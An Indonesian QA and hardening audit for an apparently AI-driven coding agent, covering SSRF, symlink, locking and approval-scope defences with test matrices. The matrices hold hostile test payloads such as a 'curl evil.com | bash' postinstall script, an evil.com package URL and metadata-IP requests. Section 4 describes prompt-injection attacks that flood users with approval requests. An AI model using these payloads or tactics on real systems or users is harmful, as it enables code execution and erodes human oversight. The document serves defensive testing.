# Dokumen Quality Assurance & Hardening Audit (QA.md)
## Ruko-agent v2.0.0: Edge-Cases, Adversarial Test Harness & Hardening Checklist

Dokumen ini mencatat seluruh temuan audit keamanan mikro, skenario corner-case sistem operasi, dan rancangan pengujian adversarial yang wajib diuji sebelum setiap modul di-merge ke branch `V2.0.0-dev-Unreleased`. Berkas ini menjadi acuan tunggal untuk penulisan berkas pengujian unit (`src/tests/*.test.ts`).

---

## 1. Fase 1: Inventarisasi Temuan Audit Fondasi & Solusi Rekayasa

### 1.1 Modul Network: `src/core/network/hostFetch.ts`
* **Vektor Celah: Bypass Literal IPv6 dalam Kurung Siku (`[::1]`)**
  * *Mekanisme:* Parser WHATWG URL mempertahankan kurung siku pada URL seperti `http://[::1]:8080/`. Fungsi `net.isIP("[::1]")` mengembalikan nilai 0 (tidak valid), sehingga lolos dari evaluasi IP privat.
  * *Solusi:* Lakukan normalisasi hostname dengan mengupas karakter kurung siku sebelum validasi IP:
    ```typescript
    const rawHostname = url.hostname.replace(/^\[|\]$/g, '');
    ```
* **Vektor Celah: Kebocoran Koneksi Soket (Socket Reuse / Keep-Alive)**
  * *Mekanisme:* Connection pool bawaan `http`/`https` dapat menggunakan kembali soket TCP lama saat redirect, melewati callback lookup IP pinning.
  * *Solusi:* Matikan pool secara eksplisit menggunakan opsi `agent: false` dan sematkan header `Connection: 'close'`.
* **Vektor Celah: DNS Rebinding Time-of-Check to Time-of-Use (TOCTOU)**
  * *Mekanisme:* Interval waktu mikro antara `dns.lookup()` awal dengan koneksi soket aktual.
  * *Solusi:* Callback lookup kustom langsung menyuplai `pinnedIP` hasil verifikasi pertama ke tingkat soket, mencegah lookup sekunder di level kernel.

### 1.2 Modul Sanitasi: `src/core/prompt/sanitizer.ts`
* **Vektor Celah: Mangling Nama Berkas Berkarakter Unicode Sah**
  * *Mekanisme:* Penerapan `ALLOWED_ASCII_RE` secara agresif pada path berkas mengubah karakter alfabet sah beraksen (misal `résumé.md` diubah menjadi `r\u00e9sum\u00e9.md`), merusak representasi antarmuka dan pembacaan berkas.
  * *Solusi:* Pemisahan domain tanggung jawab fungsi secara tegas:
    * `sanitizeForPrompt(input: string)`: Digunakan eksklusif untuk konten teks tak tepercaya yang disuntikkan ke prompt LLM (menerapkan NFKC, BiDi stripping, dan escape kontrol).
    * `sanitizePath(userPath: string)`: Validasi sistem berkas yang berfokus memblokir path traversal (`..`), null bytes (`\0`), dan reserved names Win32 tanpa merusak karakter alfabet multibyte UTF-8 sah.

### 1.3 Modul Konkurensi & Mutex: `src/core/state/fileLock.ts`
* **Vektor Celah: Penghentian Detak Jantung Senyap (Silent Heartbeat Stoppage)**
  * *Mekanisme:* Pemanggilan `fs.utimes()` di background timer yang gagal akibat disk penuh atau permission drop akan memutus heartbeat loop tanpa logging peringatan.
  * *Solusi:* Tambahkan pencatatan peringatan stderr dan implementasikan toleransi kegagalan berturut-turut (maksimal 3 kali retry) sebelum merilis atau mematikan lock.
* **Vektor Celah: Pergeseran Waktu Sistem (Clock Skew) pada Stale Detection**
  * *Mekanisme:* Penyesuaian waktu NTP drastis dapat menyebabkan selisih `Date.now() - stat.mtimeMs` bernilai negatif atau melampaui batas stale secara prematur.
  * *Solusi:* Gunakan perhitungan selisih berbasis nilai absolut dan berikan batas toleransi (grace period) minimum.

### 1.4 Modul Isolasi Subproses: `src/core/executor/resourceGovernor.ts`
* **Vektor Celah: Restriksi PATH Merusak Version Manager Developer (DX Broken)**
  * *Mekanisme:* Mengunci `PATH` statis hanya ke `/usr/local/bin:/usr/bin:/bin` menyebabkan biner toolchain lokal (`node`, `tsc`, `cargo`, `pnpm`) yang terpasang melalui nvm, fnm, asdf, atau volta tidak dapat ditemukan.
  * *Solusi:* Lakukan resolusi path biner kompilator absolut sebelum masuk ke `spawnIsolated`, atau bangun allowlist direktori toolchain pengguna yang terverifikasi (misalnya memfilter entri `process.env.PATH` yang berada di direktori pengguna terpercaya):
    ```typescript
    function sanitizePathEnv(rawPath: string): string {
      const allowedDirs = rawPath.split(path.delimiter).filter(dir => {
        return !dir.includes('..') && (dir.startsWith('/usr') || dir.includes('.nvm') || dir.includes('.cargo') || dir.includes('nodejs'));
      });
      return allowedDirs.join(path.delimiter);
    }
    ```
* **Vektor Celah: Buffer Accumulation Memory Spike**
  * *Mekanisme:* Akumulasi output proses anak via penggabungan string Buffer dapat memakan memori berlebih sebelum batas 10MB tercapai.
  * *Solusi:* Lacak penghitung byte (`byteCounter`) secara streaming pada event data. Jika penghitung melebihi batas, langsung panggil `killProcessTree` dan hentikan pembacaan stream seketika.

### 1.5 Modul Guard Manifest: `src/core/verification/packageJsonGuard.ts`
* **Vektor Celah: Catastrophic Backtracking (ReDoS) pada Regex SemVer**
  * *Mekanisme:* Penggunaan ekspresi reguler SemVer yang panjang pada string versi yang dirancang khusus dapat memicu ReDoS pada V8.
  * *Solusi:* Batasi panjang string versi maksimum 64 karakter sebelum evaluasi regex dijalankan.
* **Vektor Celah: Subpath Imports Hijacking**
  * *Mekanisme:* Penyerang menyuntikkan entri berbahaya pada field `imports` di `package.json` untuk memetakan alias modul internal ke berkas sistem di luar root.
  * *Solusi:* Blokir penambahan atau modifikasi field `imports` yang mengarah ke luar root workspace atau menggunakan protokol eksternal.

### 1.6 Modul Redaksi Log: `src/core/logging/redactionStream.ts`
* **Vektor Celah: Secret Bocor di Batas Chunk Buffer (512-Byte Boundary Splitting)**
  * *Mekanisme:* Memotong string sebelum menjalankan fungsi `redactText` menyebabkan token rahasia yang terbelah di batas potongan (misal `ghp_` di potongan awal dan sisa token di potongan akhir) lolos dari deteksi regex.
  * *Solusi:* Potong buffer hanya pada batas baris baru (`\n`) terakhir sebelum safe margin 512 byte. Jika tidak ada newline, lakukan redaksi pada seluruh buffer terlebih dahulu sebelum memotong sisa tail.

### 1.7 Modul Otorisasi Scope: `src/core/approval/scopeAmendment.ts`
* **Vektor Celah: Proses Menggantung di Lingkungan Headless / CI Tanpa TTY**
  * *Mekanisme:* Pemanggilan `rl.question` di runner CI/CD non-interaktif membuat proses tertahan tanpa batas waktu (hanging process).
  * *Solusi:* Validasi `process.stdin.isTTY`. Jika berada di lingkungan non-TTY atau non-interaktif, otomatis gagalkan (*fail-closed*). Tambahkan timer batas waktu 30 detik untuk sesi lokal interaktif.

### 1.8 Modul Pembacaan Berkas: `src/core/tools/secureRead.ts`
* **Batasan Platform: Ketiadaan `O_NOFOLLOW` pada Windows**
  * *Karakteristik:* Windows Win32 tidak mendukung flag kernel `O_NOFOLLOW`.
  * *Mitigasi:* Jalankan iterasi pemeriksaan segmen per-path secara ketat (`fs.lstat` pada setiap subfolder) sebelum membuka berkas, dan lakukan verifikasi silang `fs.realpath` pasca-buka.

---

## 2. Matriks Uji & Skenario Adversarial Fase 1 (Test Harness)

| ID Uji | Modul Target | Payload / Kondisi Uji | Perilaku yang Diharapkan |
| :--- | :--- | :--- | :--- |
| **TC-NET-01** | `hostFetch.ts` | `http://[::1]:8080/api` (IPv6 Literal) | Ditolak seketika dengan `SSRFError` (`PRIVATE_IP_BLOCKED`). |
| **TC-NET-02** | `hostFetch.ts` | Redirect 302 dari `http://safe.com` ke `http://169.254.169.254` | Hop 1 lolos, Hop 2 melempar `SSRFError` sebelum request terkirim. |
| **TC-NET-03** | `hostFetch.ts` | Host DNS dengan 2 record (IP Publik + IP Privat 10.0.0.1) | Ditolak karena salah satu record terdeteksi privat. |
| **TC-SEC-01** | `secureRead.ts` | Symlink di root repo mengarah ke `/etc/passwd` | Melempar error `SYMLINK_ESCAPE` atau `SYMLINK_BLOCKED`. |
| **TC-SEC-02** | `secureRead.ts` | Target path mengandung null byte `safe.txt\0.js` | Melempar error `NULL_BYTE`. |
| **TC-SEC-03** | `secureRead.ts` | Path dengan nama file beraksen `docs/panduan_résumé.md` | Berkas terbaca utuh tanpa error karakter. |
| **TC-LCK-01** | `fileLock.ts` | Dua proses mencoba mengambil lock path yang sama secara simultan | Proses A memperoleh lock, Proses B menunggu antrean hingga timeout/rilis. |
| **TC-LCK-02** | `fileLock.ts` | Direktori `.lock` sengaja diatur dengan mtime 15 detik lalu (stale) | Lock lama dievakuasi paksa; proses baru berhasil membuat lock. |
| **TC-PKG-01** | `packageJsonGuard.ts` | Menyuntikkan dependensi `"express": "http://evil.com/pkg.tgz"` | Ditolak dengan alasan injeksi URL eksternal. |
| **TC-PKG-02** | `packageJsonGuard.ts` | Mengubah skrip postinstall: `"curl evil.com \| bash"` | Ditolak karena manipulasi skrip siklus hidup. |
| **TC-PKG-03** | `packageJsonGuard.ts` | Nilai versi SemVer sepanjang >100 karakter acak | Ditolak oleh limit karakter sebelum regex dieksekusi. |
| **TC-RED-01** | `redactionStream.ts` | Token `ghp_...` terbelah persis di akhir chunk byte 512 | Token disensor penuh menjadi `[REDACTED:GITHUB_TOKEN]`. |
| **TC-GOV-01** | `resourceGovernor.ts` | Eksekusi subprocess yang memakan waktu 35 detik (timeout default 30s) | Proses anak beserta process tree dibunuh secara tuntas (`SIGKILL`). |
| **TC-GOV-02** | `resourceGovernor.ts` | Subprocess mencoba membaca `process.env.NODE_OPTIONS` | Variabel terbaca `undefined` (telah dibersihkan di sandbox). |
| **TC-SCM-01** | `scopeAmendment.ts` | Perubahan di dalam subfolder yang disetujui (Subtree Auto-Approve) | Mutasi langsung diizinkan tanpa memunculkan prompt interaktif. |
| **TC-SCM-02** | `scopeAmendment.ts` | Mutasi di luar subtree pada lingkungan non-TTY (`CI=true`) | Amandemen otomatis ditolak tanpa menggantung sesi. |

---

## 3. Checklist Verifikasi Pre-Merge (Definition of Quality)
Sebelum Pull Request digabungkan ke cabang utama:
* [x] **Zero-Dependency Check:** `package.json` tidak memiliki entri `dependencies` runtime (hanya `devDependencies` untuk testing).
* [x] **Platform Parity:** Rangkaian uji adversarial lolos 100% pada platform Linux (Ubuntu), macOS, dan Windows.
* [x] **No Unhandled Rejections:** Seluruh operasi I/O dan jaringan memiliki blok `finally` untuk merilis file handle, timer detak jantung, atau stream listener.
* [x] **Fail-Closed Verification:** Saat terjadi kegagalan parser (JSON rusak, timeout, error filesystem), sistem selalu memilih opsi penolakan izin paling restriktif (deny-by-default).
* [x] **Audit Trail Integrity:** Setiap penolakan akses atau amandemen izin tercatat ke dalam append-only hash chain log dengan format JSON kanonis.

---

## 4. Fase 2: Konsolidasi Audit Red-Teaming Multi-Model Frontier (Mythos, DeepSeek, Grok, Qwen, Sol, Kimi)

Bagian ini mendokumentasikan sintesis temuan adversarial dari enam model frontier independen terhadap arsitektur dan primitif native Ruko-agent v2.0.0. Fokus mitigasi diarahkan pada resolusi semantic gap, konkurensi filesystem, ketahanan status (state durability), serta pencegahan Denial-of-Service by Design tanpa melanggar mandat zero-dependency.

### A. Vektor Kerentanan & Mitigasi Arsitektur

#### 1. Network & Resolver SSRF Boundary (Mythos & Kimi k3)
* **Vektor Celah:**
  * *Parser vs Resolver Semantic Gap:* `net.isIP("0x7f.0.0.1")` mengembalikan 0 (dianggap nama host), tetapi resolver OS (`getaddrinfo` via `inet_aton` legacy) menerjemahkannya ke `127.0.0.1`.
  * *Celah CIDR Loopback & Metadata:* Pemblokiran hanya pada `127.0.0.0/8` dan `::/128` meloloskan alamat loopback riil IPv6 (`::1/128`), alamat wildcard Linux/macOS yang dirutekan ke host (`0.0.0.0/8`), serta Cloud Instance Metadata Service / Link-Local (`169.254.0.0/16`, `fe80::/10`).
* **Mitigasi Teknis (`hostFetch.ts`):**
  * Evaluasi CIDR hanya dijalankan pada alamat IP kanonis (`pinnedIP`) hasil resolusi DNS manual (`dns.resolve4/6`), bukan pada string URL input mentah.
  * Daftar CIDR terlarang diperluas:
    * IPv4: `0.0.0.0/8`, `10.0.0.0/8`, `127.0.0.0/8`, `169.254.0.0/16`, `172.16.0.0/12`, `192.168.0.0/16`.
    * IPv6: `::/128`, `::1/128`, `fe80::/10` (Link-Local), `fc00::/7` (ULA), serta IPv4-mapped (`::ffff:0:0/96`).
  * Koneksi soket mengabaikan DNS internal runtime dengan menyematkan opsi `lookup: () => { throw new SSRFError(); }` dan mengikat langsung ke `pinnedIP`.

#### 2. Compiler Gate Execution & Argv Sanitization (Mythos & Sol)
* **Vektor Celah:**
  * *Windows Batch Wrapper Spoofing:* Mengeksekusi `./node_modules/.bin/tsc` pada Windows mengeksekusi `tsc.cmd` melalui `cmd.exe`. Repositori tak tepercaya dapat menyisipkan `tsc.cmd` berbahaya untuk memicu eksekusi kode saat Plan Mode.
  * *Argv Injection:* Jika opsi baris perintah dapat dipengaruhi input LLM (IPI), flag seperti `--outDir /path` dapat disuntikkan untuk memicu mutasi file di Plan Mode.
* **Mitigasi Teknis (`resourceGovernor.ts` / Tier 0 Gate):**
  * *Bypass direktori `.bin/`:* Eksekusi langsung entry point JavaScript kompilator menggunakan biner Node resmi:
    ```typescript
    const tscPath = path.join(workspace, 'node_modules/typescript/bin/tsc');
    spawn(process.execPath, [tscPath, '--noEmit'], { shell: false, env: isolatedEnv });
    ```
  * Kunci opsi baris perintah (`argv`) secara statis ke `['--noEmit']`; tolak seluruh parameter tambahan dari prompt atau model.

#### 3. Concurrency Mutex & Deterministic Reclamation (DeepSeek, Grok, Qwen, Kimi k3)
* **Vektor Celah:**
  * *Stale Eviction TOCTOU:* Primitif `fs.mkdir` aman untuk akuisisi awal, namun pemulihan otomatis (*auto-eviction*) berbasis `mtime` rentan terhadap *split-brain* ketika dua proses bersamaan mengeksekusi `rmSync` lalu `mkdirSync`.
  * *Scheduler-Skew Starvation:* Eksekusi tugas sinkron intensif (sanitasi Unicode NFKC file besar atau kompilasi AST) memblokir event-loop Node.js, menunda interval detak jantung sehingga sesi sehat dieviksi keliru oleh waiter lain.
  * *Fail-Closed Overlap (Kimi):* Menghentikan sistem secara permanen (*hard HALT*) tanpa jalur pemulihan deterministik merusak ergonomi saat terjadi Ctrl+C atau sleep.
* **Mitigasi Teknis (`fileLock.ts`):**
  * Ganti pembuatan folder dengan pembuatan berkas eksklusif kernel:
    ```typescript
    const fd = fs.openSync(lockPath, 'wx', 0o600); // O_CREAT | O_EXCL atomik
    fs.writeSync(fd, JSON.stringify({ pid: process.pid, nonce: crypto.randomUUID(), createdAt: Date.now() }));
    fs.closeSync(fd);
    ```
  * Hapus background auto-eviction buta. Jika terjadi tabrakan lock (`EEXIST`):
    * Periksa keaktifan PID via `process.kill(pid, 0)`.
    * Jika PID tidak ditemukan (`ESRCH`), berikan prompt interaktif satu ketukan di TUI:
      `"Sesi sebelumnya (PID: <pid>) telah berhenti mendadak. Bersihkan lock dan lanjutkan? [Y/n]"`
    * Pada lingkungan CI/non-interaktif, sistem berhenti dengan instruksi bendera eksplisit `--force-unlock`.

#### 4. State Durability & Directory Fsync Portability (DeepSeek, Grok, Kimi k3)
* **Vektor Celah:**
  * *Truncated State Write:* Crash atau `ENOSPC` saat `fs.writeFileSync` meninggalkan `state.json` dalam kondisi korup. Fallback fail-open (misal mereset ke bypass mode) membuka Plan Mode Lock secara tidak sah.
  * *Directory Rollback:* Operasi `fs.rename` tanpa fsync pada direktori induk dapat membatalkan perubahan nama berkas setelah kegagalan daya, merusak rantai hash audit.
  * *Unsupported dir fsync (Kimi):* Memanggil fsync pada deskriptor direktori di lingkungan WSL2, Docker OverlayFS, atau partisi FAT32 memicu error fatal `EINVAL` / `ENOTSUP`.
* **Mitigasi Teknis (`hostState.ts`):**
  * Terapkan protokol penulisan atomik 3-tahap:
    ```typescript
    const tmp = `${statePath}.${crypto.randomUUID()}.tmp`;
    const fd = fs.openSync(tmp, 'wx', 0o600);
    fs.writeSync(fd, JSON.stringify(state));
    fs.fsyncSync(fd);
    fs.closeSync(fd);
    fs.renameSync(tmp, statePath);

    // Directory fsync best-effort untuk kompatibilitas container/WSL:
    if (process.platform !== 'win32') {
      try {
        const dirFd = fs.openSync(path.dirname(statePath), 'r');
        fs.fsyncSync(dirFd);
        fs.closeSync(dirFd);
      } catch (err: any) {
        if (!['EINVAL', 'ENOTSUP', 'EOPNOTSUPP', 'EBADF', 'EPERM', 'EACCES'].includes(err.code)) {
          throw err;
        }
      }
    }
    ```
  * *Fail-Closed State Parsing:* Jika parsing JSON atau verifikasi integritas HostState gagal saat pemulihan sesi, sistem wajib melempar `CorruptedStateError` dan menghentikan eksekusi tanpa intervensi pemulihan manual.

#### 5. Subtree Traversal, Prefix Collision & Monorepo Symlinks (DeepSeek, Grok, Kimi k3)
* **Vektor Celah:**
  * *Sibling Directory Prefix Collision:* Pengecekan berbasis `target.startsWith(approved)` meloloskan direktori tetangga (misal `/repo/src-evil` di bawah izin `/repo/src`).
  * *Pre-existing Symlink Escape:* Symlink internal repositori yang dibuat sebelum sesi (misal `repo/src/link -> /etc`) lolos validasi visual string tetapi menulis ke direktori sensitif host.
  * *Monorepo False Deny (Kimi):* Symlink internal yang sah pada monorepo (pnpm store atau npm workspace) ditolak keliru karena resolusi fisik keluar dari subfolder individual.
* **Mitigasi Teknis (`scopeAmendment.ts`):**
  * Validasi hierarki fisik wajib diselesaikan pada direktori induk target sebelum berkas dibuat (menghindari `ENOENT`):
    ```typescript
    const canonicalParent = fs.realpathSync(path.dirname(targetPath));
    const canonicalApproved = fs.realpathSync(approvedScope);

    const isInsideSubtree = canonicalParent === canonicalApproved ||
                            canonicalParent.startsWith(canonicalApproved + path.sep);
    ```
  * *Dukungan Monorepo Terdaftar:* Agen membaca konfigurasi workspace (`pnpm-workspace.yaml`, manifest root) untuk mendaftarkan direktori paket sah ke dalam batas otorisasi kanonis.

#### 6. Anti-DoS Amendment Circuit Breaker & Scope Contraction (Sol & Kimi k3)
* **Vektor Celah:**
  * *Approval Fatigue / Livelock (Sol):* Prompt injection berantai memaksa agen mengajukan amandemen path luar secara terus-menerus hingga pengguna keliru menyetujui.
  * *Amendment Flooding Self-DoS (Kimi):* Counter penolakan global (misal 3x tolak = kunci sesi) dapat disalahgunakan repositori jahat untuk memicu penolakan buatan dan melumpuhkan tugas sah developer.
  * *Privilege Creep:* Model ekspansi monotonik membuat persetujuan keliru pada direktori induk (misal `/`) tidak dapat dibatalkan sepanjang sesi.
* **Mitigasi Teknis (`scopeAmendment.ts`):**
  * *Consecutive-Identical Tripwire:* Circuit breaker hanya aktif jika agen meminta amandemen pada target kanonis yang sama persis sebanyak 3 kali berturut-turut pasca-penolakan pengguna.
  * *Non-Punitive Cancellation:* Penolakan amandemen hanya membatalkan sub-tugas yang bersangkutan, tanpa melumpuhkan runtime utama atau mereset paksa mode ke plan.
  * *Scope Contraction Utility:* Sediakan instruksi terminal manual (`/scope reset` atau opsi TUI) untuk mereset daftar `approvalScope` kembali ke batas direktori kerja awal repositori.

---

### B. Matriks Uji Adversarial Komprehensif (Test Harness Extension)

| ID Uji | Modul Target | Payload / Skenario Pengujian | Hasil yang Diharapkan (Pass Criteria) | Status |
| :--- | :--- | :--- | :--- | :--- |
| **TC-NET-04** | `hostFetch.ts` | Request ke URL literal IPv4 non-standar: `http://0x7f.0.0.1:3000` atau `http://0.0.0.0:80` | Ditolak seketika dengan `SSRFError` (`PRIVATE_IP_BLOCKED`). | belum ditinjau |
| **TC-NET-05** | `hostFetch.ts` | Request ke loopback IPv6 `http://[::1]:8080` dan metadata link-local `http://169.254.169.254` | Ditolak seketika dengan `SSRFError` (`METADATA_OR_LOOPBACK_BLOCKED`). | belum ditinjau |
| **TC-GOV-03** | `resourceGovernor.ts` | Eksekusi Compiler Gate pada repositori Windows dengan berkas palsu `node_modules/.bin/tsc.cmd` | Agen mengabaikan `.cmd` wrapper dan memanggil `typescript/bin/tsc` via `process.execPath`. | **ditinjau-diterima (Fase 2 Hardening §7)** |
| **TC-GOV-04** | `resourceGovernor.ts` | Injeksi argumen berbahaya pada kompilator: `['--noEmit', '--outDir', '/tmp']` | Eksekutor menolak parameter tambahan; hanya parameter konstan `['--noEmit']` yang diteruskan. | **ditinjau-diterima (Fase 2 Hardening §7)** |
| **TC-LCK-01** | `fileLock.ts` | Simulasi 50 proses paralel bersaing melakukan acquire lockfile secara simultan | Tepat satu proses yang memperoleh deskriptor berkas (`fd > 0`); 49 lainnya menerima error `EEXIST`. | **ditinjau-diterima (Fase 1 Hardening §8)** |
| **TC-LCK-02** | `fileLock.ts` | Lockfile eksis di disk dengan metadata PID yang sudah mati (`kill(pid, 0)` melempar `ESRCH`) | Agen mendeteksi status yatim (deadlock); menampilkan opsi reklamasi interaktif atau halt tertib. | **ditinjau-diterima (Fase 1 Hardening §8)** |
| **TC-STA-01** | `hostState.ts` | Manipulasi berkas `state.json` terpotong (truncated payload) akibat simulasi ENOSPC | Resume gagal tertib (*Fail-Closed*); melempar `CorruptedStateError` tanpa fallback ke bypass mode. | **ditinjau-diterima (Fase 1 Hardening §9)** |
| **TC-STA-02** | `hostState.ts` | Operasi penulisan status pada lingkungan dengan overlayfs tanpa dukungan directory fsync | Operasi fsync pada file tetap sukses; error `EINVAL` pada direktori ditangani via graceful fallback. | **ditinjau-diterima (Fase 1 Hardening §9)** |
| **TC-SCM-03** | `scopeAmendment.ts` | Upaya mutasi berkas di balik symlink pra-eksisting yang mengarah keluar dari workspace | Resolusi fisik direktori induk mendeteksi pelarian hierarki; operasi ditolak atau memicu prompt amandemen. | **ditinjau-diterima (Fase 3 §6)** |
| **TC-SCM-04** | `scopeAmendment.ts` | Upaya mutasi pada direktori tetangga (sibling prefix): target `/repo/src-patch/x` vs scope `/repo/src` | Pengecekan pembatas segmen mendeteksi ketidaksesuaian path; menolak eksekusi mutasi otomatis. | belum ditinjau |
| **TC-SCM-05** | `scopeAmendment.ts` | Eksekusi perintah kontraksi scope pasca-perluasan hierarki ke root sistem | Array `approvalScope` tereduksi kembali hanya memuat direktori kanonis awal repositori. | belum ditinjau |
| **TC-FSM-01** | `scopeAmendment.ts` | Prompt injection berulang meminta amandemen ke path terlarang yang identik sebanyak 3 kali | Tripwire aktif pada penolakan ketiga; membatalkan rantai tindakan terkait tanpa melumpuhkan sesi. | belum ditinjau |
| **TC-FSM-02** | `scopeAmendment.ts` | Modifikasi berkas dependensi internal pada struktur monorepo symlink (pnpm) | Path divalidasi terhadap daftar root workspace monorepo; tidak memicu false rejection. | **ditinjau-diterima (Fase 3 §6)** |
